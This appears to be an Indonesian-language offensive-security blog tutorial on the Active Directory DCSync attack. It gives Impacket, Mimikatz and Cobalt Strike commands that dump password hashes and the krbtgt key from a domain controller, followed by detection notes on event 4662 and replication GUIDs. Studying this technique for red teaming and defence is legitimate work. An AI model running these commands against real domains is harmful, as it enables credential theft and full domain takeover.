---
title: '[Credential Theft] DCSync Attack'
date: 2022-03-09 00:20:22 +0700
categories: [Active Directory, Post Compromise Attack]
tags: [active directory, active directory hacking, windows hacking, post compromise attack, credential theft, mimikatz, cobalt strike, dcsync]     # TAG names should always be lowercase
author: nairpaa
---

Protokol [Directory Replication Service (MS-DRSR)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) digunakan untuk mensinkronisasi dan mereplikasi data Active Directory antara domain controller. **DCSync** adalah teknik yang memanfaatkan protokol ini untuk mengekstrak data pengguna dan kredensial dari DC.


> Harap dicatat bahwa teknik ini memerlukan akses ke fungsi [GetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/b63730ac-614c-431c-9501-28d6aca91894) (`Replicating Directory Changes All` dan `Replicating Directory Changes`) yang biasanya hanya tersedia untuk administrator domain.
> 
> ![Konfigurasi Replication Directory Changes](/assets/img/posts/dcsync-attack/1.png)
> _Konfigurasi Replication Directory Changes_
{: .prompt-info }

## 0x1 - Exploitation Stages

### A. Impacket

```bash
➜ secretsdump.py <domain>/<username>:<password>@<ip-dc>
```

### B. Mimikatz

```bash
mimikatz > lsadump::dcsync /domain:<domain> /user:krbtgt
```

![DCSync pada Mimikatz](/assets/img/posts/dcsync-attack/2.png)
_DCSync pada Mimikatz_

### C. Beacon + Mimikatz

Cobalt Strike memiliki perintah khusus `dcsync`, yang menjalankan `lsadump::dcsync` pada Mimikatz.

```bash
beacon> make_token DEV\naruto P@ssw0rd # login sebagai domain admin
Beacon> dcsync dev.example.io DEV\krbtgt # Ekstrak kunci NTLM dan AES dengan shortcut cobalt strike
Beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt # Ekstrak kunci NTLM dan AES dengan perintah mimikatz
```

Kredensial yang didapatkan secara otomatis di simpan pada menu **View > Credentials**.

![Krendensial Tersimpan di Cobalt Strike](/assets/img/posts/dcsync-attack/3.png)
_Krendensial Tersimpan di Cobalt Strike_

> **OPSEC**
>
> *Directory replication* dapat terdeteksi jika *Directory Service Access auditing* diaktifkan, dengan mencari untuk event 4662 dimana GUID yang mengidentifikasi adalah `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (**DS-Replication-Get-Changes** dan **DS-Replication-Get-Changes-All**) atau `89e95b76-444d-4c62-991a-0facbeda640c` (**DS-Replication-Get-Changes-In-Filtered-Set**).
>  
> Kita bisa menggunakan kata kunci "`Suspicious Directory Replication`" pada Kibana untuk melihat *log* ini.
{: .prompt-danger }

*Replication traffic* biasanya hanya terjadi antara domain controller tetapi juga dapat dilihat melalui aplikasi seperti [Azure AD Connect](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-azure-ad-connect). Organisasi yang *mature* harus membuat *baseline* *traffic* DRS yang khas untuk menemukan *outlier* yang mencurigakan.

---

## 0x2 - References

- https://adsecurity.org/?p=1729
- https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync
- https://www.qomplx.com/kerberos_dcsync_attacks_explained/
- https://www.youtube.com/watch?v=aSAZzIqGeiY
- https://yojimbosecurity.ninja/dcsync/#org4679e78
- https://burmat.gitbook.io/security/hacking/domain-exploitation

